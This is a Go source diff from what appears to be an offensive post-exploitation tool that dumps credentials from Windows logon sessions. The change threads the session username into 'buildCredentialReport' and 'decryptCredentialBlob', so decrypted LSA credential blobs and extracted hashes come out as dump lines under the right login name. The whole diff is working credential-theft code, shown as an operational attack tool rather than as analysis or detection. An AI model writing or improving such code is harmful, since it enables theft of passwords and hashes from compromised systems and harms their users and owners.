@@ -206,8 +206,17 @@ func executeInsituFullInner() structs.CommandResult {
 			if len(creds) > 0 {
 				nodesWithCreds++
 				report.Credentials = make([]insituFullCredentialReport, 0, len(creds))
+				sessionUser := parsed.UserName
+				if sessionUser == "" && len(report.MatchedUsers) > 0 {
+					for _, sess := range luidIndex[parsed.LUID] {
+						if sess.Username != "" {
+							sessionUser = sess.Username
+							break
+						}
+					}
+				}
 				for _, c := range creds {
-					credReport := buildCredentialReport(c, canDecrypt, cryptoMaterial, &credBlobsCaptured, &credBlobsDecrypted, &hashesExtracted, &dumpLines)
+					credReport := buildCredentialReport(c, canDecrypt, cryptoMaterial, sessionUser, &credBlobsCaptured, &credBlobsDecrypted, &hashesExtracted, &dumpLines)
 					report.Credentials = append(report.Credentials, credReport)
 				}
 			}
@@ -258,9 +267,12 @@ func executeInsituFullInner() structs.CommandResult {
 }
 
 // buildCredentialReport constructs a single credential report entry, performing
-// decryption if key material is available. Counters are updated in-place.
+// decryption if key material is available. sessionUser is the logon session's
+// username (from Phase 2C-i), used for dump line generation since the
+// PRIMARY_CREDENTIALS envelope's Primary field is the auth package name, not
+// the user's login name. Counters are updated in-place.
 func buildCredentialReport(c credentialListEntry, canDecrypt bool, material lsaCryptoMaterial,
-	blobsCaptured, blobsDecrypted, hashes *int, dumpLines *[]string) insituFullCredentialReport {
+	sessionUser string, blobsCaptured, blobsDecrypted, hashes *int, dumpLines *[]string) insituFullCredentialReport {
 	credReport := insituFullCredentialReport{
 		Address:       fmt.Sprintf("0x%X", c.Address),
 		AuthPackageId: c.AuthPackageId,
@@ -289,7 +301,7 @@ func buildCredentialReport(c credentialListEntry, canDecrypt bool, material lsaC
 			*blobsCaptured++
 
 			if canDecrypt {
-				dec, line := decryptCredentialBlob(material, c.Primary.EncryptedBytes, c.Primary.UserName)
+				dec, line := decryptCredentialBlob(material, c.Primary.EncryptedBytes, sessionUser)
 				credReport.Decrypted = dec
 				if dec != nil && dec.ParseErr != "" {
 					credReport.DecryptErr = dec.ParseErr
